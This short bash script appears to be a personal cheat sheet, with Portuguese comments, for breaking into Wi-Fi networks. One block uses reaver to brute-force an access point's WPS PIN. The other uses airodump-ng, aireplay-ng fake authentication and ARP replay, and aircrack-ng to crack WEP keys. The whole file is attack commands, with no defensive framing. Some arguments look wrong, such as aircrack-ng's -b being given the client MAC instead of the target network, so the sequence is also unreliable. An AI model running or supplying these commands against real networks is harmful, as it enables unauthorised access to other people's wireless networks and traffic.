#!/bin/bash


#####REAVER
airmon-ng start wlp3s0
ifconfig wlp3s0mon down
iwconfig wlp3s0mon mode monitor
ifconfig wlp3s0mon up
airodump-ng wlp3s0mon
reaver -i wlp3s0mon -b <mac> -vv

####WEP
airmon-ng start wlp3s0
airodump-ng wlp3s0mon
airodump-ng --channel <canal> --bssid <mac> -w wep1 wlp3s0mon

#outro terminal
aireplay-ng -1 -0 -e <nomerede> -a <mac> -h 5c:c9:d3:14:40:3f wlp3s0mon
aireplay-ng -3 -b <MAC> -h 5c:c9:d3:14:40:3f wlp3s0mon

#outro
aireplay-ng -1 -0 -e <nomerede> -a <mac> -h 5c:c9:d3:14:40:3f wlp3s0mon
aircrack-ng -b 5c:c9:d3:14:40:3f wep1-01.cap
